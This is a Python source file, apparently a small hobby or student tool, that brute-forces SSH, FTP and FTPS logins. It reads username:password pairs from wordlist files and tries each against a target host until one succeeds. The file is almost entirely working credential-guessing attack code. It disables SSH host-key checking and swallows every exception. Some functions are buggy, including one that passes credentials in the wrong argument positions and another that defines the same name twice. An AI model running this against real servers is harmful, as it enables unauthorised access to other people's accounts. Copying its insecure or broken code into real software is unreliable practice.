import os
from ftplib import FTP, FTP_TLS
from time import sleep

import paramiko
from paramiko import SSHClient


def sshConnection(host, port=22, user='', passwd=''):
    # client.load_system_host_keys()

    # client.load_host_keys('~/.ssh/known_hosts')
    # client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        client = SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, port=port, password=passwd)
        client.close()
        return user, passwd
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except paramiko.ssh_exception.SSHException:
        return False
    except:
        return False


def ftpConnection(host, port=21, user='', passwd=''):
    host = host
    username = user
    password = passwd
    port = 21

    if not user and not passwd:
        try:
            ftp = FTP()
            ftp.connect(host, port)
            ftp.connect()
            ftp.quit()
            return "anonymous", ""
        except:
            # ('ConnectionRefusedError')
            return False
    try:
        ftp = FTP()
        ftp.connect(host, port)
        ftp.login(username, password)
        ftp.quit()
        return username, password

    except:
        # print('ConnectionRefusedError')
        return False


def ftpsConnection(host, port=21, user='', passwd=''):
    host = host
    username = user
    password = passwd

    if not user and not passwd:
        try:
            ftp = FTP_TLS()
            ftp.connect(host, port)
            ftp.connect()
            ftp.quit()
            return "anonymous", ""
        except:
            # ('ConnectionRefusedError')
            return False
    try:
        ftp = FTP_TLS()
        ftp.connect(host, port)
        ftp.login(username, password)
        ftp.quit()
        return username, password

    except:
        # ('ConnectionRefusedError')
        return False


def sshSimpleBruteForce():
    pass


def ftpSimpleBruteForce(ip, port):
    with open('../RESSOURCES/ftp.txt', 'r') as lignes:
        for ligne in lignes.readlines():
            ligne = ligne.strip()
            login = ligne.split(':')[0]
            mdp = ligne.split(':')[1]
            result = ftpConnection(ip, login, mdp)
            if result:
                return (result)
        return (False)


def ftpsSimpleBruteForce(ip, port):
    with open('../RESSOURCES/ftp.txt', 'r') as lignes:
        for ligne in lignes.readlines():
            ligne = ligne.strip()
            login = ligne.split(':')[0]
            mdp = ligne.split(':')[1]
            result = ftpsConnection(ip, port, login, mdp)
            if result:
                return (result)
        return (False)


def sshSimpleBruteForce(ip, port, display=False):
    with open('../RESSOURCES/ssh.txt', 'r') as lignes:
        for ligne in lignes.readlines():
            ligne = ligne.strip()
            login = ligne.split(':')[0]
            mdp = ligne.split(':')[1]

            if display:
                print('Test - {login} / {password}'.format(login=login, password=mdp))

            result = sshConnection(ip, port, login, mdp)

            if result:
                if display:
                    print('Work with - {login} / {password}'.format(login=login, password=mdp))
                return (result)
        return (False)


if __name__ == '__main__':
    sshSimpleBruteForce('127.0.0.1', 22, True)
    #sshConnection('127.0.0.1',22,'user','user')
